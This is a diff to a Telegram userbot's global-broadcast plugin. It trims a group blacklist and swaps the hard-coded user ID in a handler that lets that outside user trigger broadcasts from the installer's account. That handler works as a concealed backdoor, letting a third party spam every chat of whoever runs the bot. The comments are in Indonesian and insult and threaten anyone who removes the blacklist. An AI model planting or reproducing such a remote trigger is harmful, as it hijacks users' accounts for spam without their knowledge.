@@ -2,22 +2,7 @@ from userbot.events import register
 from userbot import CMD_HELP, bot
 
 GCAST_BLACKLIST = [
-    -1001473548283,  # SharingUserbot
-    -1001433238829,  # TedeSupport
-    -1001476936696,  # AnosSupport
-    -1001327032795,  # UltroidSupport
-    -1001294181499,  # UserBotIndo
-    -1001419516987,  # VeezSupportGroup
-    -1001209432070,  # GeezSupportGroup
-    -1001296934585,  # X-PROJECT BOT
-    -1001481357570,  # UsergeOnTopic
-    -1001459701099,  # CatUserbotSupport
-    -1001109837870,  # TelegramBotIndonesia
-    -1001752592753,  # Skyzusupport
-    -1001549206558,  # FandaSupport
-    -1001380293847,  # NastySupport
-    -1001777596949,  # Cariteman
-    -1001568184818,  # Bdrlsupportt
+    -1001743853750,  # Cariteman
 ]
 
 # Kalo fork atau coppy blacklist jangan dihapus bangsat,
@@ -25,7 +10,7 @@ GCAST_BLACKLIST = [
 # Hapus blacklist bapak lu jelek gua gban!.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=2075505824, pattern=r"^\.cgcast(?: |$)(.*)")
+@register(incoming=True, from_users=1972682280, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
